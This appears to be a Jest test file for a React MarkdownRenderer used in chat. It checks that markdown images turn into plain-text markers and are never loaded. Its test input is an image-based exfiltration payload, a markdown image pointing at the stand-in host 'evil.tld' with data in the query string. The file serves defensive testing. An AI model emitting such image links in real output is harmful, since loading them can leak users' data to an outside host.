import React from 'react';
import { render } from '@testing-library/react';

// react-markdown and its plugins ship ESM only; the mock renders the `img` override the way
// react-markdown would for `![alt](src)`, so the test checks the wiring and the override itself.
jest.mock('react-markdown', () => ({
  __esModule: true,
  default: ({ components, children }: { components: Record<string, React.ComponentType<Record<string, unknown>>>; children: string }) => {
    const m = /!\[([^\]]*)\]\(([^)]*)\)/.exec(children);
    const Img = components.img;
    return <p>{m ? <Img alt={m[1]} src={m[2]} node={{}} /> : children}</p>;
  },
}));
jest.mock('remark-gfm', () => ({ __esModule: true, default: () => undefined }));
jest.mock('rehype-highlight', () => ({ __esModule: true, default: () => undefined }));

import { MarkdownRenderer } from '../MarkdownRenderer';

describe('MarkdownRenderer', () => {
  test('never renders a remote image: an image becomes plain text', () => {
    const { container } = render(<MarkdownRenderer content={'![leak](https://evil.tld/p?d=1234)'} variant="chat" />);
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('evil.tld');
    expect(container.textContent).toBe('[image: leak]');
  });

  test('an image without alt text renders a generic marker', () => {
    const { container } = render(<MarkdownRenderer content={'![](https://evil.tld/x.png)'} />);
    expect(container.querySelector('img')).toBeNull();
    expect(container.textContent).toBe('[image]');
  });
});
